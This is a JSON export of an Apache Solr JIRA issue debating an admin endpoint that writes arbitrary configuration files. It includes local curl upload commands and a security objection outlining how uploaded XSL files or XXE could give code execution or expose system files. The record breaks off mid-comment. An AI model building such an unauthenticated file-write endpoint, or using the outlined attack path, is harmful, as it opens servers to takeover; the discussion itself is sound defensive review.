{
    "id": "SOLR-5287",
    "title": "Allow at least solrconfig.xml and schema.xml to be edited via the admin screen",
    "details": {
        "affect_versions": "4.5,                                            6.0",
        "status": "Closed",
        "fix_versions": [
            "5.0",
            "6.0"
        ],
        "components": [
            "Admin UI",
            "Schema and Analysis"
        ],
        "type": "Improvement",
        "priority": "Blocker",
        "labels": "",
        "resolution": "Fixed"
    },
    "description": "A user asking a question on the Solr list got me to thinking about editing the main config files from the Solr admin screen. I chatted briefly with Stefan Matheis (steffkes) about the mechanics of this on the browser side, he doesn't see a problem on that end. His comment is there's no end point that'll write the file back.\n\nAm I missing something here or is this actually not a hard problem? I see a couple of issues off the bat, neither of which seem troublesome.\n\n1> file permissions. I'd imagine lots of installations will get file permission exceptions if Solr tries to write the file out. Well, do a chmod/chown.\n\n2> screwing up the system maliciously or not. I don't think this is an issue, this would be part of the admin handler after all.\n\nDoes anyone have objections to the idea? And how does this fit into the work that Use account \"steve_rowe\" instead has been doing?\n\nI can imagine this extending to SolrCloud with a \"push this to ZK\" option or something like that, perhaps not in V1 unless it's easy.....\n\nOf course any pointers gratefully received. Especially ones that start with \"Don't waste your effort, it'll never work (or be accepted)\"...\n\nBecause what scares me is this seems like such an easy thing to do that would be a significant ease-of-use improvement, so there has to be something I'm missing.\n\nSo if we go forward with this we'll make this the umbrella JIRA, the two immediate sub-JIRAs that spring to mind will be the UI work and the endpoints for the UI work to use.\n\nI think there are only two end-points here\n1> list all the files in the conf (or arbitrary from <solr_home>/collection) directory.\n2> write this text to this file\n\nPossibly later we could add \"clone the configs from coreX to coreY\".\n\nBTW, I've assigned this to myself so I don't lose it, but if anyone wants to take it over it won't hurt my feelings a bit....",
    "attachments": {
        "SOLR-5287.patch": "https://issues.apache.org/jira/secure/attachment/12613509/SOLR-5287.patch"
    },
    "issue_links": {},
    "comments": [
        {
            "author": "Erick Erickson",
            "id": "comment-13781794",
            "date": "2013-09-30T13:25:16+0000",
            "content": "Stefan Matheis (steffkes) Nobody is saying this is a horrible idea, what's your vision for the endpoint needed to accomplish this? "
        },
        {
            "author": "Stefan Matheis (steffkes)",
            "id": "comment-13781800",
            "date": "2013-09-30T13:34:07+0000",
            "content": "Actually that should be pretty simple? A possibility to POST a File (or the content as string .. whatever is easier) to the endpoint on the server, which stores the file on disk or in ZK. Perhaps with an Option to perform an Core-Reload to get the new schema/configuration activated?\n\nThen we can think about (more or less) fancy stuff in the UI .. something like a typical html <textarea> w/o syntax highlighting and such .. up to a fancy wizard where you can select (predefined) parts of a schema/configuration and enable them by click :o "
        },
        {
            "author": "Jan H\u00f8ydahl",
            "id": "comment-13782207",
            "date": "2013-09-30T20:40:08+0000",
            "content": "Bear in mind that hand-editing these on a production server may be undesirable in many companies, because they want to enforce strict versioning of configs and controlled official mechanisms for rolling out changes. Thus whatever we end up with, it should be possible to enable/disable this feature.\n\nFurther, I'd prefer that such GUI options (if enabled) work on top of Schema REST API and the planned Config API. This way the GUI can be made more intelligent than simply a big <textarea>, but evolve into a very intutitive \"Schema IDE\" which makes it far easier to relate to things. Available analyzers, tokenizers, tokenfilters could be fetched from SPI and be drag&dropp'ed into a fieldType etc. Telling people to start using managed schema to gain access to such a feature may not be a bad thing at all, if that's the way we're taking the product in 5.x anyway. "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13782223",
            "date": "2013-09-30T20:51:47+0000",
            "content": "Jan H\u00f8ydahl Hmmm, I hadn't thought much about that. I know the REST API isn't complete yet, I think I saw a JIRA float by that you couldn't, for instance, update a field.\n\nHmmm, that would be an interesting way to pretty thoroughly make the REST API robust. Also, there wouldn't be any special code on the server, anything that had to e done to the server would be done in enhancing the REST API.\n\nI had in mind a really quick hack here, but it really seems like the right thing to do is do it the right way. Siiiggggh. \n\nUse account \"steve_rowe\" instead Grant Ingersoll What do you think? I took a quick look at the copyfield patch and it doesn't look like a huge effort to build on what's been done before for each new bit we want to support, or am I dreaming?\n\nStefan Matheis (steffkes) This makes the UI part a bit different, instead of POSTing, you'd use one of the (perhaps new) REST API calls. Any comments one way or the other?\n "
        },
        {
            "author": "Stefan Matheis (steffkes)",
            "id": "comment-13782242",
            "date": "2013-09-30T21:00:58+0000",
            "content": "the simple textarea was only meant to be a starting point, calling a REST API is fine as well - would need to now what options are available on that, but in general that's possible as well, for sure.\n\noffering some kind of a wizard is always a bit tricky since you have to offer really all the possible options, otherwise some people can't use it and/or you have to provide that ugly \"others\" option, where (if one uses it) the complete drag & drop idea goes out of the door :/\n\nsimple baseline: i'm fine either way - let's do what we can & what make sense with the features in mind (:\n\nJan H\u00f8ydahl that \"SPI\" you mentioned, not sure what the abbreviation stands for? "
        },
        {
            "author": "Jan H\u00f8ydahl",
            "id": "comment-13782255",
            "date": "2013-09-30T21:20:06+0000",
            "content": "This could be done in steps for sure. First add ability to POST an entire schema through the REST API and implement that in Admin GUI, much like your original plan. Then implement support for the rest of todays Schema API (https://cwiki.apache.org/confluence/display/solr/Schema+API). Finally, extend the API to delete and modify stuff.\n\nBy SPI I mean Service Provider Interface, where each tokenfilter etc registers itself so you can discover them, e.g. you could refer to the Synonym filter by \"synonym\" instead of \"solr.SynonymFilterFactory\" since it's registered as a service. Believe it should be possible to list all registered components, but I have not tried. "
        },
        {
            "author": "Uwe Schindler",
            "id": "comment-13782272",
            "date": "2013-09-30T21:29:38+0000",
            "content": "Yes, works, you can list all factories registered by SPI:\n\n\thttp://lucene.apache.org/core/4_4_0/analyzers-common/org/apache/lucene/analysis/util/TokenizerFactory.html#availableTokenizers()\n\thttp://lucene.apache.org/core/4_4_0/analyzers-common/org/apache/lucene/analysis/util/TokenFilterFactory.html#availableTokenFilters()\n\thttp://lucene.apache.org/core/4_4_0/analyzers-common/org/apache/lucene/analysis/util/CharFilterFactory.html#availableCharFilters()\n\n\n\nFYI: The same works with Codecs,... "
        },
        {
            "author": "Jan H\u00f8ydahl",
            "id": "comment-13782300",
            "date": "2013-09-30T21:46:02+0000",
            "content": "It would be super cool to expose these via some API too so people could make 3rd party schema builders without hardcoding filter names in the tool itself.\n\nAnd the next step would be to allow Analysis Factories to implement something like getConfigSpec() to document available/allowed configuration options, much like a DTD or schema for allowed params and values. But this is done via NamedLists now so we don't get anything for free through introspection and would probably need to invent some internal JSON syntax for this. "
        },
        {
            "author": "Uwe Schindler",
            "id": "comment-13782308",
            "date": "2013-09-30T21:56:53+0000",
            "content": "Jan: The main problem is the crazy transformation Solr does with these names for backwards compatibility. SolrResourceLoader detects factories with regexps and converts it to the \"simple\" names taken by the SPI. Unfortunately, currently Solr does not allow to specify the \"canonical name\" of the analyzer.\n\nIn general we should remove class=\"solr.FooBarFactory\" support from the analyzer schema and rename this to e.g., name=\"whitespace\" without *Factory that gets directly passed to the SPI. For backwards compatibility in 4.x we can still resolve \"solr.FooBarFactory\", but in 5.0 only real existing class names should work (if used with class). For \"official\" factories, only use name=\"\" (which also reads much better). "
        },
        {
            "author": "Uwe Schindler",
            "id": "comment-13782320",
            "date": "2013-09-30T22:04:00+0000",
            "content": "See: LUCENE-4044 "
        },
        {
            "author": "Jan H\u00f8ydahl",
            "id": "comment-13782355",
            "date": "2013-09-30T22:33:59+0000",
            "content": "Yea, +1 to supporting the short-name in schema. It's more readable after all.\n\nI played with a sample self-documentation format which could be used by GUI to pull plugin documentation from server instead of hardcoding in HTML. Could also use for generating this part of the documentation for the ref-guide and avoid mismatch. And it would benefit Lucene and ES users as well as Solr users!\n\nExample return string for synonymFilterFactory#getConfigSpec()\n\n{ \"key\" : \"synonym\",\n  \"name\" : \"Synonym filter\",\n  \"desc\" : \"Token filter which expands synonyms from a provided dictionary\",\n  \"see\" : \"http://lucene.apache.org/core/4_4_0/analyzers-common/org/apache/lucene/analysis/synonym/SynonymFilter.html\",\n  \"params\" : [\n      { \"name\" : \"synonyms\", \"info\" : \"Name of synonym dictionary file\", \"value\" : \"STRING\" },\n      { \"name\" : \"format\", \"info\" : \"Specify format of the dictionary. May be solr or snowball\", \"value\" : [ \"solr\", \"snowball\" ]},\n      { \"name\" : \"ignoreCase\", \"info\" : \"Set to true for case insensitive\", \"value\" : \"BOOLEAN\" },\n      { \"name\" : \"expand\", \"info\" : \"If true, a synonym will be expanded to all equivalent synonyms. If false, all equivalent synonyms will be reduced to the first in the list\", \"value\" : \"BOOLEAN\" },\n      { \"name\" : \"tokenizerFactory\", \"info\" : \"Which tokenizer to use when parsing the dictionary. Use either shortname or class name\", \"value\" : \"ref:TOKENIZERS\"}\n   ]\n}\n\n\n\nWell, guess we're way off-track here compared to original issue. Let's spin off separate JIRAs for whatever we'd like to achieve  "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13817459",
            "date": "2013-11-08T17:03:22+0000",
            "content": "I'm coming back around to this. It looks (and we'll have more info on this next week when [~sarowe] has had a chance to straighten me out), like it'll be relatively easy to piggy-back on the REST-API work and allow it to handle arbitrary files in the conf directory. I'm envisioning a new option in the managed schema config for solrconfig. Currently, the <schemaFactory> tag takes a tag like:\n\n<str name=\"managedSchemaResourceName\">managed-schema</str>\n\nSo what if we allowed something like\n<str name=\"managedSchemaResourceName\">managed-all-conf</str>\nor\n<str name=\"managedSchemaResourceName\">managed-schema managed-all-conf</str>\nor just assume that managed-all-conf enabled both the \"push the whole file\" option and using the managed schema. I think the managed schema will allow for a really nice UI interface that'll be valuable, and the people \"who don't need no stinking wizard\" can just freely edit the raw files.\n\nthe \"managed-all-conf\" list + CRUD operations on any file in the conf directory (maybe more later). The infrastructure is in place to push this to SolrCloud, so it seems like about the same amount of work to do it all.\n\nThat takes care of the ability to restrict this capability by configuration, getting things to the cloud etc. From a UI perspective, it's just a POST to the right URL with the body of the file.\n\nAnyway, that's the current thinking... "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13820863",
            "date": "2013-11-13T02:49:19+0000",
            "content": "Well, this is scary. I hacked together a butchery of ShowFileRequestHandler (so far only local no ZK support).\n\nThe most work was refactoring this a bit so I could re-use some of the work already there.\n\nBut it...works. Even updating files in subdirectories of conf, e.g. velocity.\n\nIt turns out that ShowFileRequestHandler already lists the contents of a directory if it is a directory. So something like:\n\nhttp://localhost:8983/solr/collection1/admin/file?file=velocity\n\nwill list the contents of the conf/velocity, and\n\nhttp://localhost:8983/solr/collection1/admin/file\n\nwill list the contents of the conf directory itself.\n\nSo, adding a param \"op=write\" and \"file=whatever\" and posting a stream to Solr \"just works\". These two curl commands did the trick, giving me a stream to work with:\n\ncurl -X POST --form \"fileupload=@schema.eoe\" 'http://localhost:8983/solr/collection1/admin/file?op=write&file=schema.xml'\n\ncurl -X POST --form \"fileupload=@eoe.vm\" 'http://localhost:8983/solr/collection1/admin/file?op=write&file=velocity/error.vm'\n\nStefan Matheis (steffkes) Is this enough to see if this could work from the admin UI?\n\nEveryone: Mostly I'm putting this up to see what people think. [~sarowe] and I chatted this evening, there are still some questions about how this and managed schemas should interact when both are active at once. \n\nYou can also hide files if you so choose, the code already does that. If the UI gives you a set of files to choose from you just wouldn't see one to try to change although you could still cURL stuff if you wanted, but this is the admin UI after all.\n\nIf you opened a binary file, I assume you'd see garbage and wouldn't want to proceed anyway, but that's a bit of a hole.\n\nWe should post a warning indicating that the changes won't take effect until after a core reload. I'm reluctant to actually reload automatically on the theory that one might want to make a series of related changes and apply them all at once. Perhaps Stefan Matheis (steffkes) (or someone) could put a button on whatever page we come up with rather than making the user go to the cores page after editing?\n\nWhat would be really cool is if there were an easy way to tell if at least the xml was well-formed before saving, but that's a bell and whistle.\n\nOne thing that we may get \"for free\" is editing these even if the core fails to load. But I have to check that out when the admin UI is operational.\n\nAnd I still have to check whether lazily-loaded cores work, but this is enough for tonight.\n\nAnd, as usual at this point, I haven't checked things over very carefully, run precommit or test yet. Mostly I'm wondering what people think of the approach.\n\nLet me know... "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13821358",
            "date": "2013-11-13T13:57:42+0000",
            "content": "I tried running with a transient core and that works just fine. It works for the same reason this code doesn't work if, say, schema.xml isn't well formed. Part of getting to this handler is getting the core, which will load a transient core but will fail if, say, the schema.xml is malformed. If the core doesn't load, we never get a chance to replace the bad configs since the exception is thrown before we get here. \n\nYou do get a long ugly stack trace back from the cURL command though, telling you things like \"Caused by: org.xml.sax.SAXParseException; systemId: solrres:/schema.xml; lineNumber: 245; columnNumber: 4; The element type \"schema\" must be terminated by the matching end-tag \"</schema>\".\"\n\nI'm not going to try to do anything about this, at least for the first cut. I'm just going to document it. I'm envisioning this functionality as an easy way to make tweaks. You can recover from some problems, for instance declaring a default field in solrconfig.xml that doesn't exist.\n\nI don't see any intrinsic reason why it would be impossible to make this functionality work even when the configs were totally messed up, but that would require duplicating the logic in the core's classLoader/resourceLoader and that's a place I don't want to go right now. Also, if we go to ZK being \"the one source of truth\" I think the problem changes.\n\nOn to trying to make this work with ZK. "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13821926",
            "date": "2013-11-13T22:32:13+0000",
            "content": "This may be ready to commit, running tests now.\n\nIt allows for disabling modifying conf files through through the admin/file handler. It allows updates of arbitrary files in the conf directory (e.g. velocity/error.vm).\n\nI'm a little askance at the name of the file, ShowFileRequestHandler is a bit misleading, is it worth renaming to something like \"ConfFileRequestHandler\"?\n\nIt works with SolrCloud. Reloading the collection is required of course.\n\nSo if some kind person is able to make the Solr admin UI do some of things:\n1> list files either in the conf directory or subdirectories and allow someone to pick one to edit.\n2> post the edited files to Solr\n3> perhaps provide a reload button on the editing page that may have to be sensitive to whether we're in SolrCloud mode or not, i.e. reload core or collection depending.\n4> Extra special bonus: Do some kind of XML validation on the \"save\" step to insure it's well-formed.\n\nThen we can wrap this up and put it out into the wild.\n\nI think the UI work should be a separate JIRA.\n\nThis pretty much ignores the managed schema issues. But I think that it's OK [~sarowe] do you agree? If people edit schema.xml without doing a reload, then use the managed schema stuff, then their edits are lost. That seems OK to me..\n\nIf there are no objections, I'll commit this over the weekend and we can make separate UI issues. I really need somebody to step up and take the admin UI work Stefan Matheis (steffkes) Are you there . Or anyone else who really understands browsers.\n "
        },
        {
            "author": "Stefan Matheis (steffkes)",
            "id": "comment-13821931",
            "date": "2013-11-13T22:38:13+0000",
            "content": "hopefully i'm not to late to the party Erick (: Have been and still am busy with the current projects - but will try to get a least a first look at it tomorrow .. perhaps there is time on the weekend to bring a bit more of that great stuff! "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13822572",
            "date": "2013-11-14T16:29:13+0000",
            "content": "Stefan:\n\nNope, you're right on time. I'll be around this weekend too, although in a different time zone... "
        },
        {
            "author": "Stefan Matheis (steffkes)",
            "id": "comment-13822917",
            "date": "2013-11-14T21:05:45+0000",
            "content": "so .. i got it, hopefully. what i'd say we do (in that separate ticket, as you mentioned) is:\n\nadd a new page called \"Files\" (or something like that) which starts with a typical file-tree, as we have it in the \"Cloud\"-Section already .. which enables you to browse directories & files and view their contents.\n\nright now this patch only allows file-uploads (or at least i didn't manage it to accept raw text which i posted to this endpoint)? the code is using \"input streams\" .. no idea if that is fileupload-specific?\n\nbecause if we could post the content of a file .. we could offer two choices: \n\n\n\tupload a complete file, you have on your disk\n\tchange into an \"edit\" mode .. and then post the changed file from within your browser\n\n\n\nwhich would basically mean you could modify your schema w/o the need to download, modify & re-upload it.\n\nthat would be like we have it already on the \"Data Import\" Page .. where you could send a dataConfig parameter, which then is used instead of the persisted configuration (related code is in the DataImportHandler.java)\n "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13822925",
            "date": "2013-11-14T21:13:36+0000",
            "content": "It's working for me by specifying a request parameter 'stream.body=put your text here', even from within some tests I'm writing. Does that work for you? I freely admit this is somewhat of a mystery to me. "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13823012",
            "date": "2013-11-14T22:14:01+0000",
            "content": "New patch with tests.\n\nStefan Matheis (steffkes).  There are some ways I worked out to add streams to the request, don't know whether they're applicable for the UI or not.\n\nMay be very close to committable, but I have to check a few things yet. "
        },
        {
            "author": "Stefan Matheis (steffkes)",
            "id": "comment-13823020",
            "date": "2013-11-14T22:18:36+0000",
            "content": "It's working for me by specifying a request parameter 'stream.body=put your text here', even from within some tests I'm writing. Does that work for you? I freely admit this is somewhat of a mystery to me.\n\nAha! That works like a charm .. i'm +1 on that, will come up with a patch for the UI "
        },
        {
            "author": "Stefan Matheis (steffkes)",
            "id": "comment-13823059",
            "date": "2013-11-14T22:43:43+0000",
            "content": "before i forget to mention it:\n\n4> Extra special bonus: Do some kind of XML validation on the \"save\" step to insure it's well-formed.\nthat could be possible for the files you change \"in browser\" .. but depending on the size of the xml-document and your browser that might not be the best idea :/\n\nwhere it's definitely not possible, is for uploaded files - we can't access their content before/while uploading.\n\nif we want to have a reliable way .. we should do it on the serverside .. perhaps with an option to disable this check? even if i don't see a reason for that, because if you're sending a xml document .. that has to be valid either way.\n\nwe could make it dependent from the contentType .. if you're sending application/xml or text/xml .. xml validation does its job and in case of failure tells you so? "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13823083",
            "date": "2013-11-14T23:04:13+0000",
            "content": "about XML validation... That was more one of those things like \"if it's really easy, otherwise we'll put it in a future JIRA\" IMO.....\n\nBut yeah, I was just thinking of doing it in the browser before uploading. What the intent was was to keep people from shooting themselves in the foot when editing in the browser by messing up, say, their schema.xml file and making the core unable to load. If they do, they can't continue editing via the browser. \n\nOf course they can still upload perfectly well-formed XML and get into the same state, I didn't have anything comprehensive in mind. "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13823674",
            "date": "2013-11-15T13:58:26+0000",
            "content": "I'm going to give this a review this morning, then commit unless there are objections.\n\nThen Stefan Matheis (steffkes) can work his UI magic and we can collaborate. Stefan, do you have\na separate UI JIRA? "
        },
        {
            "author": "Stefan Matheis (steffkes)",
            "id": "comment-13823799",
            "date": "2013-11-15T16:53:53+0000",
            "content": "Sorry, Assignee shouldn't be changed - that was by accident. UI-Ticket is created: SOLR-5446 "
        },
        {
            "author": "ASF subversion and git services",
            "id": "comment-13823858",
            "date": "2013-11-15T17:53:49+0000",
            "content": "Commit 1542345 from Erick Erickson in branch 'dev/trunk'\n[ https://svn.apache.org/r1542345 ]\n\nSOLR-5287: Allow at least solrconfig.xml and schema.xml to be edited via the admin screen "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13823859",
            "date": "2013-11-15T17:54:04+0000",
            "content": "Final patch, committing.\n\nStefan Matheis (steffkes) I suspect you can just revert all the files that changed as a result of my last patch and re-apply this one so we're all in sync. "
        },
        {
            "author": "ASF subversion and git services",
            "id": "comment-13823962",
            "date": "2013-11-15T19:09:31+0000",
            "content": "Commit 1542369 from Erick Erickson in branch 'dev/branches/branch_4x'\n[ https://svn.apache.org/r1542369 ]\n\nSOLR-5287: Allow at least solrconfig.xml and schema.xml to be edited via the admin screen "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13823964",
            "date": "2013-11-15T19:09:55+0000",
            "content": "Works as far as I can tell, we can open up new JIRAs as necessary. "
        },
        {
            "author": "Uwe Schindler",
            "id": "comment-13835855",
            "date": "2013-11-30T18:18:10+0000",
            "content": "Hi,\nI don't want to be \"the bad guy\" or a showstopper, but this should be reverted before Solr 4.7 comes out. From a security perspective, we cannot do this at all, unless we add some login features to the admin UI and some request handlers.\n\nTogether with the help of security guys we already closed some horrible leaks in Solr, that may be used to view local files outside of Solr's config directly. Some examples are the recently XML-based attacks: external entities on data imports (SOLR-3895), escaping from SolrResourceLoader to read etc/passwd (SOLR-4882),...\n\nThis week the Redhat people contacted me about those issues and they are very happy that they are resolved. Now they are also working on Solr 3.6.x and will fix the issues there, too.\n\nThe problems with all this is partly Solr's openness for requests from anywhere, so in an ideal world, you have to use a firewall to limit access to the Solr server.\n\nUnfortunately a firewall is not always enough. If you have something like a small XXE vulnerability in your front-end server (using Solr) and the user from the outside can \"trick\" the server to send special crafted HTTP-requests to the Solr server behind your firewall (the Solr server must be accessible from the fron-end server, otherwise you would not be able to use Solr).\n\nBy closing those attacks I took care of, at least big issues can be prevented (although you might be still possible to execute some crazy javascript with function queries - if enabled in the config), but you can no longer send documents to solr that use xinclude/external entities to load local files from the server. Or ask for velocity templates or XSL stylesheets from outside config dir.\n\nThe problem opened by this issue is the following: You can upload any arbitrary file to the config directory without any checks. So you could theoretically also upload an XSL file and then use it with the tr=... parameter. As XSL can execute any java code, you have full control on the system.\n\nAnother thing is the fact that we allow explicitely xinclude and external entities on solrconfig and solrschema.xml (to allow structuring your config into parts). This was done under the knowledge, that the files using external entities/xinclude can only be placed in the config dir, if you have access to the local file system on the server.\n\nNow that you can upload any file and change anything, you are wide open to any attack you can think of. There is no more security at all, once you have access to ShowFileRequestHandler, you can do anything on the Solr server, really anything!\n\nIf you are interested about how to \"hack\" a Solr server (before 4.6) that is sitting behind a firewall through a vulnerable front-end server, read http://www.agarri.fr/blog/\n\nRedhat already assigned 3 CVE numbers to these issues and take the older issues seriously, and they will patch older versions and also force users to upgrade. cf, CVE-2013-6397 (SOLR-4882), CVE-2013-6407 (SOLR-3895), CVE-2013-6408 (SOLR-4881).\n\nIf Redhat would know about this feature in Solr 4.7, they would throw Solr out of the window and remove it from their packages! This commit will make the project really look bad for security people. And users will think that Solr should be avoided. "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13835866",
            "date": "2013-11-30T19:03:14+0000",
            "content": "Well, crap. This appears to be my day for batting 0. If it's that serious a security\nissue, I have no objection to reverting it.\n\nBut the timing is awkward. I'm in the middle of moving and preparing to leave\nnext week on a trans-Atlantic sailing trip, I'll be gone until probably the end of the\nyear.\n\nAnyone want to volunteer?\n\nBTW, I take it this doesn't apply to the REST API for manipulating the schema? "
        },
        {
            "author": "Uwe Schindler",
            "id": "comment-13835867",
            "date": "2013-11-30T19:10:52+0000",
            "content": "Hi Erick,\n\nBTW, I take it this doesn't apply to the REST API for manipulating the schema?\n\nIt should not apply, because this does not support uploading arbitrary files or modifying plain XML that can get exploited with xinclude/external entities. The schema modification APIs hopefully only allow \"semantic changes\" to the schema, but does not allow to upload XML snippets to be included in those files without checks. I think Steve Rowe can comment on this, thanks for the pointer! "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13835870",
            "date": "2013-11-30T19:35:02+0000",
            "content": "Hmmm, This capability can be turned off. Would it be satisfactory\nto disable rather than enable by default and put it on the admin \nto enable it only in secure/dev environments? The intent here, after\nall, is to ease development/getting started rather than be \nsomething available in a production system.\n\nCurrently, turning this off is accomplished by a bit of a trick,\ndefining \"hidden\" files, i.e. files that you can't see/modify as  *.\nIt should be easy enough to require explicit enablement of the\ncapability instead, which wouldn't be mutually exclusive with\nspecifying hidden files.\n\nIf that would work, it'll require a big fat warning similar to\nenableRemoteStreaming.\n\nOr would that still be too insecure?\n\nFWIW, I went through the JIRAs and here are the revision numbers\nfor this and related JIRAs as far as I can tell:\n\n4x\n1542369\n1542721\n1542875\n1543370\n1543685\n\nTrunk\n1542345\n1542720\n1542859\n1543368\n1543660 "
        },
        {
            "author": "Uwe Schindler",
            "id": "comment-13835873",
            "date": "2013-11-30T19:58:45+0000",
            "content": "Hi,\nin my opinion, this feature should not be there at all. The better way to fix this would be to also allow modifications of the solrconfig.xml with an API (like the schema editing), not by uploading files. This config editing would need to be enabled by setting a property in the config, so user is warned, that all local file formatting gets lost. Also special stuff like external entities would be undone when editing the config. It is still risky to allow this, because the configuration may contain some special settings, which can also open holes in security.\n\nKeeping this editing feature disabled by default is in my opinion not really an option, because editing config files with the admin UI is only for beginners, but if they have to edit the config itsself on the local file system to use this feature, it would not really help them.\nSo I would revert this commit and work maybe on some API to allow changing settings in solrconfig, which are safe (not allow to change the data directory of a core or change security related stuff in request handlers...). E.g. safe would be indexConfig settings like mergePolicy,...\n\nSorry for the trouble, but I am afraid of the consequences of keeping this in solr (also disabled by default). Solr is a good server tool, but making it more insecure just for ease of use of beginner users is contra-productive. "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13835877",
            "date": "2013-11-30T20:37:46+0000",
            "content": "bq: because editing config files with the admin UI is only for beginners, ... but if they have to edit the config itsself on the local file system to use this feature, it would not really help them....\n\nLet's agree to disagree on these points. I frequently want to change the configs and the admin UI would be a convenient way to do that. Especially when coaching clients remotely who may or may not have installed the system and who may or may not know where the configs are on the filesystem. One person one time would change the config to enable this, while people tinker with the config files all the time, so IMO editing solrconfig.xml once would be effort well spent.\n\nAs far as the beginners statement is concerned, the cavalier way we dismiss the difficulty people have when they just start using Solr has disturbed me for quite some time, there's no way I'll agree that we should not consider an option because it's \"just for beginners\". Everyone's a beginner sometime.\n\nThat said, the issue is security, the rest is a distraction. Let's keep the discussion focused on that. Would disabling this capability by default answer the security issue? Or is it still too much of a \"back door\"? That's the central question IMO, and I'll gladly defer to your expertise in this area.\n\nWhether a REST-API would be a better way to address the possibility is certainly a valid point, and one I entertained early on. Uploading configs seemed much easier to implement, as in \"progress, not perfection\". But if \"easier\" means a major security hole, even with the capability disabled by default, then there's not much more to discuss, we'll have to back it out.\n "
        },
        {
            "author": "Uwe Schindler",
            "id": "comment-13835878",
            "date": "2013-11-30T20:54:04+0000",
            "content": "As far as the beginners statement is concerned, the cavalier way we dismiss the difficulty people have when they just start using Solr has disturbed me for quite some time, there's no way I'll agree that we should not consider an option because it's \"just for beginners\". Everyone's a beginner sometime.\n\nThat is a valid point, but before we do something that can edit files on the server that use scripting/external entities/..., we should make the admin UI and all related RequestHandlers protected. This would be a good step into the right direction. Later we could also add possibilities to e.g. restrict access to update request handlers, too. Ideally, every request handler should have some security settings (accessible for specific users/ip adresses/...).\n\nIf you go on vacation before you can proceed with this, we should revert for now. We can rethink later, but it is better that a revert is done by the person who committed it. "
        },
        {
            "author": "Mark Miller",
            "id": "comment-13835880",
            "date": "2013-11-30T21:29:58+0000",
            "content": "it is better that a revert is done by the person who committed it.\n\nI don't think that is true at all. It's better if we don't revert someones commit when we know either they will be pissed or it when it 'feels' wrong.\n\nReverting someones commit that is failing the build and they have gone away? No problem IMO. They can fix the issue and re commit.\n\nReverting someone else's commit when someone says they are +1 and don't have the time? No problem IMO.\n\nThe revert issue is around commit wars. Good faith reverts are not a problem and can easily be reverted themselves. "
        },
        {
            "author": "Mark Miller",
            "id": "comment-13835881",
            "date": "2013-11-30T21:38:04+0000",
            "content": "Point being I guess, Erick, if you don't have the time and we need to have this out shortly, I can tackle it for you. "
        },
        {
            "author": "Uwe Schindler",
            "id": "comment-13835882",
            "date": "2013-11-30T21:41:25+0000",
            "content": "I don't think that is true at all.\n\nYou misunderstood me. I asked him to revert because he is going on vacation, nothing more. I have technical problems with the commit, so I hope we can fix this.\n\nI am fine with just disabling that by default, but from my standpoint it's still risky. Because if Erick tells his customers to enable this feature, so he can give them phone support, I am sure those people will forget to disable it after the phone support is done.\n\nFYI, I will veto any release containing this enabled (although this does not count, jaja, I know). "
        },
        {
            "author": "Uwe Schindler",
            "id": "comment-13835884",
            "date": "2013-11-30T22:08:41+0000",
            "content": "\nit is better that a revert is done by the person who committed it.\nYou misunderstood me.\n\nSorry, I misunderstood YOU  I just wanted to be pollite and ask him to revert before he leaves for vacation, as I was not involved in this commit. The reason for the above statement was more, because I have no idea what needs to be reverted together with this one (many linked issues....), so it would be good to let somebody with more knowledge do this. I don't want to break the UI, because ShowFileRequestHandler can no longer accept uploaded files. "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13835885",
            "date": "2013-11-30T22:19:14+0000",
            "content": "Mark:\n\nI took Uwe's revert comment as a response to my comment that I'd\nbe going away soon, I specifically asked for volunteers helping with the\nrevert if I can't get to it. So that's fine, no revert wars here.\n\nThe question is \"revert or disable by default\" I think. I agree with Uwe's\npoint that it will be enabled then forgotten, but I'm not sure how far we\ncan protect people from shooting themselves in the foot.\n\nI'm seeing if I can get a clean revert locally just to have it ready.\nI'd like to get one or the other done ASAP on the theory that I'd really hate\nto do either one on the way out the door for a month. I don't intend\nto commit either before, probably, Tuesday to let people who are on\nvacation weigh in on which way to go.\n\nThanks for the offer to help! I'll see if I need to take you up on it,\ndepending on what the decision is. "
        },
        {
            "author": "Yonik Seeley",
            "id": "comment-13835886",
            "date": "2013-11-30T22:33:32+0000",
            "content": "Although I haven't had a chance to try this feature myself, if people think it's useful I'd rather see it disabled (at most) than removed.  We shouldn't go overboard letting security concerns hurt usability. "
        },
        {
            "author": "Mark Miller",
            "id": "comment-13835887",
            "date": "2013-11-30T22:38:36+0000",
            "content": "So that's fine, no revert wars here.\n\nRight - that is my point. I've seen this idea expressed before on the lists though - that only you should revert your own commits - and that is of course silly. We have a commit then review policy - if someone commits something quickly and then goes on vacation and someone reviews it, I don't want this new idea of don't revert anyone else commits to take hold. You just can't revert in bad faith. We want to keep the 4x branch releasable, and people come and go on their own schedule.\n\nbut I'm not sure how far we can protect people from shooting themselves in the foot.\n\nOne argument would be we could go as far as to not give them a dangerous loaded weapon and instead do it properly with API's once we get there. I don't have a strong opinion though - other than agreeing it should not be enabled by default.\n\nI'll see if I need to take you up on it\n\nJust ping my name in the issue. "
        },
        {
            "author": "Robert Muir",
            "id": "comment-13835889",
            "date": "2013-11-30T22:49:39+0000",
            "content": "Maybe the easiest thing is to pull out the \"writing\" from the \"ShowFileRequestHandler\".\n\nTo me, thats confusing/misleading (if its gonna be mixed with the \"showing\", please renaming the handler!).\n\nAnyway, if there was a EditFileHandler, it could be commented out. And someone could (today, in 4.x) add shit in tomcat/jetty to secure that with special passwords or whatever if they want.\n\nin 5.x we could probably get all this setup correctly with passwords or whatever where it could be enabled by default (maybe just with jetty stuff behind the scenes). "
        },
        {
            "author": "Mark Miller",
            "id": "comment-13835896",
            "date": "2013-11-30T23:27:55+0000",
